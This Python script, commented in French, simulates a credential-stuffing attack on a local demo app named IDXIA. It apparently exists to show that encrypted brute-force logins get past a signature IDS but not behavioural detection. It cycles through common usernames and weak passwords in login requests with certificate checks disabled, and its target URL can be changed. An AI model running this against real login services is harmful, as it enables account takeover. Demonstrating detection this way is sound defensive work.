"""
attack_credential_stuffing.py

Simule une attaque de credential stuffing contre l'app de demo IDXIA.
Envoie rapidement de nombreuses tentatives de connexion avec des
identifiants differents, en HTTPS (comme une vraie attaque de ce type),
pour illustrer que ce trafic chiffre echappe a un IDS a signatures
(Suricata) mais pas au comportement applicatif observe par IDXIA.

Usage :
    python attack_credential_stuffing.py
    python attack_credential_stuffing.py --count 50 --delay 0.2
"""

import argparse
import random
import time

import requests
import urllib3

# Certificat auto-signe cote serveur de demo -> on desactive juste
# l'avertissement de verification (contexte de demo uniquement).
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

USERNAMES = ["admin", "alice", "bob", "root", "test", "administrator", "user1"]
PASSWORDS = ["123456", "password", "admin123", "letmein", "qwerty", "P@ssw0rd"]


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", default="https://localhost:5443/login")
    parser.add_argument("--count", type=int, default=30)
    parser.add_argument("--delay", type=float, default=0.3)
    args = parser.parse_args()

    print(f"Attaque credential stuffing : {args.count} tentatives vers {args.url}\n")

    for i in range(args.count):
        username = random.choice(USERNAMES)
        password = random.choice(PASSWORDS)
        try:
            resp = requests.post(
                args.url,
                json={"username": username, "password": password},
                verify=False,
                timeout=5,
            )
            print(f"[{i + 1}/{args.count}] {username}:{password} -> {resp.status_code}")
        except requests.RequestException as e:
            print(f"[{i + 1}/{args.count}] Erreur : {e}")
        time.sleep(args.delay)


if __name__ == "__main__":
    main()